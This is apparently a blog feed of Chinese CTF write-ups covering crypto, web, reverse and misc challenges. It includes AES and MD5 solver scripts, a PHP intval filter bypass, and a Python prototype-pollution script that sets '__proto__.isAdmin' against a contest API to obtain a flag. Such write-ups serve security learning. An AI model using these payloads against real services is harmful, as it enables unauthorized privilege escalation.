id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="helloCrypto"><a href="#helloCrypto" class="headerlink" title="helloCrypto"></a>helloCrypto</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plain">from Crypto.Util.number import *<br>from Crypto.Cipher import AES<br>from Crypto.Util.Padding import pad<br>import random<br><br>flag=b&#x27;BaseCTF&#123;&#125;&#x27;<br><br>key=random.randbytes(16)<br>print(bytes_to_long(key))<br><br>my_aes=AES.new(key=key,mode=AES.MODE_ECB)<br>print(my_aes.encrypt(pad(flag,AES.block_size)))<br><br># key1 = 208797759953288399620324890930572736628<br># c = b&#x27;U\xcd\xf3\xb1 r\xa1\x8e\x88\x92Sf\x8a`Sk],\xa3(i\xcd\x11\xd0D\x1edd\x16[&amp;\x92@^\xfc\xa9(\xee\xfd\xfb\x07\x7f:\x9b\x88\xfe&#123;\xae&#x27;<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plain">from Crypto.Cipher import AES<br>from Crypto.Util.Padding import unpad<br>from Crypto.Util.number import long_to_bytes<br><br># 示例密钥和密文（来自加密脚本中的注释）<br>key1 = 208797759953288399620324890930572736628<br>c = b&#x27;U\xcd\xf3\xb1 r\xa1\x8e\x88\x92Sf\x8a`Sk],\xa3(i\xcd\x11\xd0D\x1edd\x16[&amp;\x92@^\xfc\xa9(\xee\xfd\xfb\x07\x7f:\x9b\x88\xfe&#123;\xae&#x27;<br><br># 将密钥从长整数转换为字节串<br>key = long_to_bytes(key1, 16)<br><br># 初始化AES加密器<br>my_aes = AES.new(key=key, mode=AES.MODE_ECB)<br><br># 解密密文<br>decrypted_data = unpad(my_aes.decrypt(c), AES.block_size)<br><br># 输出解密后的数据<br>print(decrypted_data)<br></code></pre></td></tr></table></figure><h2 id="你会算md5吗"><a href="#你会算md5吗" class="headerlink" title="你会算md5吗"></a>你会算md5吗</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plain">import hashlib<br><br>flag=&#x27;BaseCTF&#123;&#125;&#x27;<br><br>output=[]<br>for i in flag:<br>    my_md5=hashlib.md5()<br>    my_md5.update(i.encode())<br>    output.append(my_md5.hexdigest())<br>print(&quot;output =&quot;,output)<br>&#x27;&#x27;&#x27;<br>output = [&#x27;9d5ed678fe57bcca610140957afab571&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;03c7c0ace395d80182db07ae2c30f034&#x27;, &#x27;e1671797c52e15f763380b45e841ec32&#x27;, &#x27;0d61f8370cad1d412f80b84d143e1257&#x27;, &#x27;b9ece18c950afbfa6b0fdbfa4ff731d3&#x27;, &#x27;800618943025315f869e4e1f09471012&#x27;, &#x27;f95b70fdc3088560732a5ac135644506&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;e4da3b7fbbce2345d7772b0674a318d5&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;8f14e45fceea167a5a36dedd4bea2543&#x27;, &#x27;1679091c5a880faf6fb5e6087eb1b2dc&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;, &#x27;8277e0910d750195b448797616e091ad&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;c81e728d9d4c2f636f067f89cc14862c&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;, &#x27;e1671797c52e15f763380b45e841ec32&#x27;, &#x27;e1671797c52e15f763380b45e841ec32&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;8277e0910d750195b448797616e091ad&#x27;, &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;, &#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;cbb184dd8e05c9709e5dcaedaa0495cf&#x27;]<br>&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs plain">import hashlib<br><br># 输出的MD5哈希列表<br>output = [&#x27;9d5ed678fe57bcca610140957afab571&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;,<br>          &#x27;03c7c0ace395d80182db07ae2c30f034&#x27;, &#x27;e1671797c52e15f763380b45e841ec32&#x27;,<br>          &#x27;0d61f8370cad1d412f80b84d143e1257&#x27;, &#x27;b9ece18c950afbfa6b0fdbfa4ff731d3&#x27;,<br>          &#x27;800618943025315f869e4e1f09471012&#x27;, &#x27;f95b70fdc3088560732a5ac135644506&#x27;,<br>          &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;,<br>          &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;,<br>          &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;,<br>          &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;e4da3b7fbbce2345d7772b0674a318d5&#x27;,<br>          &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;,<br>          &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;,<br>          &#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;,<br>          &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;8f14e45fceea167a5a36dedd4bea2543&#x27;,<br>          &#x27;1679091c5a880faf6fb5e6087eb1b2dc&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;,<br>          &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;,<br>          &#x27;8277e0910d750195b448797616e091ad&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;,<br>          &#x27;c81e728d9d4c2f636f067f89cc14862c&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;,<br>          &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;,<br>          &#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;, &#x27;e1671797c52e15f763380b45e841ec32&#x27;,<br>          &#x27;e1671797c52e15f763380b45e841ec32&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;,<br>          &#x27;8277e0910d750195b448797616e091ad&#x27;, &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;,<br>          &#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;,<br>          &#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;,<br>          &#x27;cbb184dd8e05c9709e5dcaedaa0495cf&#x27;]<br><br># 已知的字符MD5映射表（常见的ASCII字符集）<br>md5_map = &#123;&#125;<br>for i in range(128):  # ASCII 字符范围<br>    char = chr(i)<br>    md5_map[hashlib.md5(char.encode()).hexdigest()] = char<br><br># 还原原始 flag<br>recovered_flag = &#x27;&#x27;.join(md5_map[md5] for md5 in output)<br><br>print(&quot;Recovered flag:&quot;, recovered_flag)<br></code></pre></td></tr></table></figure><blockquote><p>更新: 2024-12-24 15:52:12<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/rklnfls84tary2pt">https://www.yuque.com/chaye-apqbl/vsc85q/rklnfls84tary2pt</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2024/6.1%E6%A0%A1%E8%B5%9B/"/>
    <url>/2026/01/19/WP/2024/6.1%E6%A0%A1%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="6-1-校赛"><a href="#6-1-校赛" class="headerlink" title="6.1 校赛"></a>6.1 校赛</h1><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a><font style="color:rgb(77, 77, 77);">Misc</font></h1><h2 id="贝斯兔子"><a href="#贝斯兔子" class="headerlink" title="贝斯兔子"></a><font style="color:rgb(77, 77, 77);">贝斯兔子</font></h2><p>先base58解密，在rot47解密</p><p><img src="/./img/49277317_MEfwxvM-1GkxEfdX/1717231546857-f6e2297b-b078-4935-bcc1-124e097b6e98-299073.png" alt="1717231546857-f6e2297b-b078-4935-bcc1-124e097b6e98.png"></p><p><img src="/./img/49277317_MEfwxvM-1GkxEfdX/1717231519300-fefdd91f-1ff0-4f3f-8628-1bbf458b80a7-050761.png" alt="1717231519300-fefdd91f-1ff0-4f3f-8628-1bbf458b80a7.png"></p><h2 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h2><p><img src="/./img/49277317_MEfwxvM-1GkxEfdX/1717242534276-d786a98c-d555-4b05-abf1-ae0449cb6c17-976054.png" alt="1717242534276-d786a98c-d555-4b05-abf1-ae0449cb6c17.png"></p><p><img src="/./img/49277317_MEfwxvM-1GkxEfdX/1717242549333-279b5577-cd03-44d8-8a3b-5de3a02e5b25-316160.png" alt="1717242549333-279b5577-cd03-44d8-8a3b-5de3a02e5b25.png"><img src="/./img/49277317_MEfwxvM-1GkxEfdX/1717242548609-3a05b653-10e9-4e27-91f8-0abf951c6121-361968.jpeg" alt="1717242548609-3a05b653-10e9-4e27-91f8-0abf951c6121.jpeg"><img src="/./img/49277317_MEfwxvM-1GkxEfdX/1717242553396-a12e9819-cb1c-4e16-a68b-1ad37102d29f-045737.png" alt="1717242553396-a12e9819-cb1c-4e16-a68b-1ad37102d29f.png"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p><img src="/./img/49277317_MEfwxvM-1GkxEfdX/1717211280990-a682b70c-f0ef-423d-9452-e1d523fd627b-891398.png" alt="1717211280990-a682b70c-f0ef-423d-9452-e1d523fd627b.png"></p><p>检查网页源代码就行</p><h2 id="Ezphp"><a href="#Ezphp" class="headerlink" title="Ezphp"></a>Ezphp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?php <br>    highlight_file(__FILE__);<br>    error_log(0);<br>    include(&#x27;flag.php&#x27;);<br>    if(isset($_GET[&#x27;num&#x27;]))&#123;<br>        $num = $_GET[&#x27;num&#x27;];<br>        if(!preg_match(&#x27;/0/&#x27;, $num))&#123;<br>            if($num===&quot;4476&quot;)&#123;<br>                die(&quot;no no no!&quot;);<br>            &#125;<br>            if(intval($num,0)===4476)&#123;<br>                echo $flag;<br>            &#125;<br>        &#125;<br>    &#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p><font style="color:#000000;">因为 intval 在处理以 0x 开头的字符串时会将其解释为十六进制数，所以可以通过传递 0x117c（十六进制的 4476）来绕过 $num&#x3D;&#x3D;&#x3D;”4476” 的检查，同时使 intval($num, 0)&#x3D;&#x3D;&#x3D;4476 成立，从而输出 $flag。</font></p><p><img src="/./img/49277317_MEfwxvM-1GkxEfdX/1717211988557-76dbdf02-6fe4-41b3-bf26-612eda5cc8a0-502371.png" alt="1717211988557-76dbdf02-6fe4-41b3-bf26-612eda5cc8a0.png"></p><p><font style="color:#000000;">可以通过构造 URL </font><a href="http://10.21.16.70:8903/"><font style="color:#000000;">http://10.21.16.70:8903/</font></a><font style="color:#000000;">&#x2F;?num&#x3D;0x117c 来利用这个漏洞，绕过类型和内容的检查，并获取 $flag 变量的内容。</font></p><p><font style="color:#000000;">但是本题目会筛选数字字符串的‘0’，而0x包含所以采用另外的方法</font></p><p><font style="color:#000000;"></font></p><p><img src="/./img/49277317_MEfwxvM-1GkxEfdX/1717219211635-446df797-cde5-4357-a0ec-281cffdc817c-662335.png" alt="1717219211635-446df797-cde5-4357-a0ec-281cffdc817c.png"></p><p><font style="color:rgb(77, 77, 77);">当某个数字被过滤时，</font><font style="color:#DF2A3F;">可以给它增加小数位来绕过</font><font style="color:rgb(77, 77, 77);">。</font></p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="安卓签到"><a href="#安卓签到" class="headerlink" title="安卓签到"></a>安卓签到</h2><p>放入jad，找到main函数，发现是个base64加密，进行解密后得到flag</p><p><img src="/./img/49277317_MEfwxvM-1GkxEfdX/1717208249780-a221f12f-a353-4f61-8835-ab4416280f0a-391627.png" alt="1717208249780-a221f12f-a353-4f61-8835-ab4416280f0a.png"></p><h2 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h2><p>先查壳</p><p><img src="/./img/49277317_MEfwxvM-1GkxEfdX/1717235014932-8a164892-1997-4a0c-b3e3-7dc30eb6510b-738679.png" alt="1717235014932-8a164892-1997-4a0c-b3e3-7dc30eb6510b.png"></p><p>放入ida32反编译</p><p>查看字符串，发现两串可疑的迷宫数据</p><p><img src="/./img/49277317_MEfwxvM-1GkxEfdX/1717235184343-b27c9e40-9b65-4e1c-bcf3-9ae09a0d8044-130876.png" alt="1717235184343-b27c9e40-9b65-4e1c-bcf3-9ae09a0d8044.png"></p><p>shift e导出字符串，然后手搓形成迷宫（不会py脚本）</p><p><img src="/./img/49277317_MEfwxvM-1GkxEfdX/1717235158503-51eb5980-4d75-48a8-988d-8f9e509587c3-740704.png" alt="1717235158503-51eb5980-4d75-48a8-988d-8f9e509587c3.png"></p><p>然后MD5解密即可，两个都试一下</p><p><img src="/./img/49277317_MEfwxvM-1GkxEfdX/1717235145716-37c597e3-4a9d-4645-a7ec-113937b41c17-669925.png" alt="1717235145716-37c597e3-4a9d-4645-a7ec-113937b41c17.png"></p><h2 id="pyd"><a href="#pyd" class="headerlink" title="pyd"></a>pyd</h2><p><img src="/./img/49277317_MEfwxvM-1GkxEfdX/1717388134157-16040417-844d-4b7a-b980-5a4e574551e8-131841.png" alt="1717388134157-16040417-844d-4b7a-b980-5a4e574551e8.png"></p><p>放入ida打开pyd，找到被变过的表</p><p><img src="/./img/49277317_MEfwxvM-1GkxEfdX/1717388156986-804ce4dd-d090-4b47-a527-d9be9cb6fdd4-397756.png" alt="1717388156986-804ce4dd-d090-4b47-a527-d9be9cb6fdd4.png"></p><p><img src="/./img/49277317_MEfwxvM-1GkxEfdX/1717388225516-e536cae2-0388-4910-b7bb-465eb3c2f410-175435.png" alt="1717388225516-e536cae2-0388-4910-b7bb-465eb3c2f410.png"></p><blockquote><p>更新: 2024-12-24 15:57:01<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/zfgrgm9k0w5pkmrb">https://www.yuque.com/chaye-apqbl/vsc85q/zfgrgm9k0w5pkmrb</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2024/5.18%E5%9B%BD%E8%B5%9B/"/>
    <url>/2026/01/19/WP/2024/5.18%E5%9B%BD%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="5-18国赛"><a href="#5-18国赛" class="headerlink" title="5.18国赛"></a>5.18国赛</h1><h2 id="火锅链观光打卡"><a href="#火锅链观光打卡" class="headerlink" title="火锅链观光打卡"></a>火锅链观光打卡</h2><p>下载metamask后连接钱包</p><p>回答10道问题，兑换即可</p><p><img src="/./img/49277317_d0Og1J9WWa6mZ9e2/1716002583262-9219bd2c-4055-40d1-983f-f4e62e1aa82b-560154.png" alt="1716002583262-9219bd2c-4055-40d1-983f-f4e62e1aa82b.png"></p><p><img src="/./img/49277317_d0Og1J9WWa6mZ9e2/1716002574099-8170cbb5-c78a-4b65-85f7-bbac3a03c09c-022925.png" alt="1716002574099-8170cbb5-c78a-4b65-85f7-bbac3a03c09c.png"></p><blockquote><p>更新: 2024-05-18 11:23:06<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/oauxids27efhexks">https://www.yuque.com/chaye-apqbl/vsc85q/oauxids27efhexks</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2024/12.15%E5%9B%BD%E8%B5%9B/"/>
    <url>/2026/01/19/WP/2024/12.15%E5%9B%BD%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="12-15国赛"><a href="#12-15国赛" class="headerlink" title="12.15国赛"></a>12.15国赛</h1><h1 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h1><h1 id="1、"><a href="#1、" class="headerlink" title="1、"></a>1、</h1><p><img src="/./img/W4lKsNKEWmaeJVXB/1734225112548-461005ea-043e-449f-8cf3-bcecd1625847-384106.png" alt="1734225112548-461005ea-043e-449f-8cf3-bcecd1625847.png"></p><p><img src="/./img/W4lKsNKEWmaeJVXB/1734225186757-cbb2db28-c0ca-4bfe-958e-cc7b804d5db2-578236.png" alt="1734225186757-cbb2db28-c0ca-4bfe-958e-cc7b804d5db2.png"></p><p><img src="/./img/W4lKsNKEWmaeJVXB/1734225261431-57e12262-1953-4b97-a1a6-2284d0693846-904499.png" alt="1734225261431-57e12262-1953-4b97-a1a6-2284d0693846.png"></p><p><img src="/./img/W4lKsNKEWmaeJVXB/1734225453776-c7557d57-a027-4fa6-9aae-97e0582dab97-512890.png" alt="1734225453776-c7557d57-a027-4fa6-9aae-97e0582dab97.png"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="random"><a href="#random" class="headerlink" title="random"></a>random</h2><p><img src="/./img/W4lKsNKEWmaeJVXB/1734227694644-f9f3f5c5-08a0-4aa5-82f0-60d4347e2808-340035.png" alt="1734227694644-f9f3f5c5-08a0-4aa5-82f0-60d4347e2808.png"></p><p><img src="/./img/W4lKsNKEWmaeJVXB/1734227778115-ac413091-acad-4550-8662-2614c7da54cd-456111.png" alt="1734227778115-ac413091-acad-4550-8662-2614c7da54cd.png"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><blockquote><p>更新: 2024-12-15 09:57:25<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/fi9fcgdtgmiuxhgm">https://www.yuque.com/chaye-apqbl/vsc85q/fi9fcgdtgmiuxhgm</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2024/11.2%E7%9C%81%E8%B5%9B%E5%88%9D%E8%B5%9B/"/>
    <url>/2026/01/19/WP/2024/11.2%E7%9C%81%E8%B5%9B%E5%88%9D%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="11-2省赛初赛"><a href="#11-2省赛初赛" class="headerlink" title="11.2省赛初赛"></a>11.2省赛初赛</h1><h1 id="团队-解题思路"><a href="#团队-解题思路" class="headerlink" title="团队-解题思路"></a><strong>团队-解题思路</strong></h1><p><strong><font style="color:rgb(255,0,0);">请注意</font></strong></p><ol><li><p>解题过程中，关键步骤不可省略，不可含糊其辞、一笔带过。</p></li><li><p>解题过程中如是自己编写的脚本，不可省略，不可截图（代码字体可以调小；而如果代码太长，则贴关键代码函数）。</p></li><li><p>所有解出的题目都必须书写WRITEUP，缺少一个则视该WRITEUP无效，成绩将无效。</p></li><li><p>WRITEUP如过于简略和敷衍，导致无法形成逻辑链条推断出对题目有分析和解决的能力，该WRITEUP可能被视为无效，成绩将无效。</p></li><li><p>提交PDF版本即可。</p></li></ol><p>6.必须包含获得flag截图。</p><p>7.每只队伍由队长统一提交一份解题思路即可，所有解题过程需保存在一个pdf内上传。</p><p>8.平台仅保留队伍最后一份解题思路，此前提交的解题思路将会自动覆盖。</p><h2 id="1-团队信息"><a href="#1-团队信息" class="headerlink" title="1.** 团队信息**"></a><strong>1.</strong>** <strong><strong>团队</strong></strong>信息**</h2><p>团队名称：Alkaid</p><p>学校:浙江工商大学</p><p>队员组成：王一涵 叶凌俊 周晋逸</p><p>排名：151</p><h2 id="2-解题情况"><a href="#2-解题情况" class="headerlink" title="2.** **解题情况"></a><strong>2.</strong>** **<strong>解题情况</strong></h2><p>答题情况截图</p><p><img src="/./img/IX6V0RjkQA1HOI2u/1730537910924-a01429f9-f4dc-421a-8e20-7543e0c739c0-256718.png" alt="1730537910924-a01429f9-f4dc-421a-8e20-7543e0c739c0.png"></p><h2 id="3-具体WP"><a href="#3-具体WP" class="headerlink" title="3.** 具体WP**"></a><strong>3.</strong>** <strong><strong>具体</strong></strong>WP**</h2><p>题目按照顺序填写</p><h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><h2 id="题目以一名称：网安知识大挑战"><a href="#题目以一名称：网安知识大挑战" class="headerlink" title="题目以一名称：网安知识大挑战"></a>题目以一名称：<font style="color:rgb(255, 255, 255);">网安知识大挑战</font></h2><p><img src="/./img/IX6V0RjkQA1HOI2u/1730529899334-862883c5-5d4d-4d2e-8742-c689c404102d-548619.png" alt="1730529899334-862883c5-5d4d-4d2e-8742-c689c404102d.png"></p><p>把原来显示重来的js代码也换成成功 然后随便乱答就可以了</p><p><img src="/./img/IX6V0RjkQA1HOI2u/1730530064259-610de2c9-b151-47fe-b129-1aa296ae459c-193923.png" alt="1730530064259-610de2c9-b151-47fe-b129-1aa296ae459c.png"></p><h2 id="2、"><a href="#2、" class="headerlink" title="2、"></a>2、</h2><p><img src="/./img/IX6V0RjkQA1HOI2u/1730527332488-20636e2d-42dd-40d0-b25f-aed033fe887d-860619.png" alt="1730527332488-20636e2d-42dd-40d0-b25f-aed033fe887d.png"></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="题目一名称：-easyjs"><a href="#题目一名称：-easyjs" class="headerlink" title="题目一名称： easyjs"></a>题目一名称： easyjs</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_note</span>():<br>    response = requests.post(<span class="hljs-string">&#x27;http://139.155.126.78:38372/api/notes&#x27;</span>, json=&#123;<br>        <span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-string">&#x27;myNote&#x27;</span>,<br>        <span class="hljs-string">&#x27;__proto__&#x27;</span>: &#123;<br>            <span class="hljs-string">&#x27;isAdmin&#x27;</span>: <span class="hljs-literal">True</span>  <br>        &#125;<br>    &#125;)<br>    <span class="hljs-keyword">return</span> response<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>():<br>    response = requests.get(<span class="hljs-string">&#x27;http://139.155.126.78:38372/api/flag&#x27;</span>, headers=&#123;<br>        <span class="hljs-string">&#x27;note-id&#x27;</span>: <span class="hljs-string">&#x27;myNote&#x27;</span>  <br>    &#125;)<br>    <span class="hljs-keyword">return</span> response<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    create_response = create_note()<br>    <br>    <span class="hljs-keyword">if</span> create_response.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Note created successfully.&quot;</span>)<br>        <br>        <br>        flag_response = get_flag()<br>        <br>        <span class="hljs-keyword">if</span> flag_response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Flag:&quot;</span>, flag_response.json().get(<span class="hljs-string">&#x27;flag&#x27;</span>))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to get flag:&quot;</span>, flag_response.json())<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to create note:&quot;</span>, create_response.json())<br></code></pre></td></tr></table></figure><p><img src="/./img/IX6V0RjkQA1HOI2u/1730531838965-b67c4a74-583e-43b2-93eb-0a9f964013d0-948186.png" alt="1730531838965-b67c4a74-583e-43b2-93eb-0a9f964013d0.png"></p><p>请注意添加关键步骤截图</p><p>获取flag截图</p><h2 id="题目二名称："><a href="#题目二名称：" class="headerlink" title="题目二名称："></a>题目二名称：</h2><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a><strong>1</strong></h2><p><img src="/./img/IX6V0RjkQA1HOI2u/1730530286639-29bfddc4-8ece-48c3-8661-6f243f12b587-297275.png" alt="1730530286639-29bfddc4-8ece-48c3-8661-6f243f12b587.png"></p><p><img src="/./img/IX6V0RjkQA1HOI2u/1730530663624-6f902e56-b169-45a2-afb7-ec915e47140d-206015.png" alt="1730530663624-6f902e56-b169-45a2-afb7-ec915e47140d.png"></p><p><img src="/./img/IX6V0RjkQA1HOI2u/1730530269056-f6b51e69-feb5-4d3f-98c1-1e88d57d9df9-372576.png" alt="1730530269056-f6b51e69-feb5-4d3f-98c1-1e88d57d9df9.png"></p><hr><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id=""><a href="#" 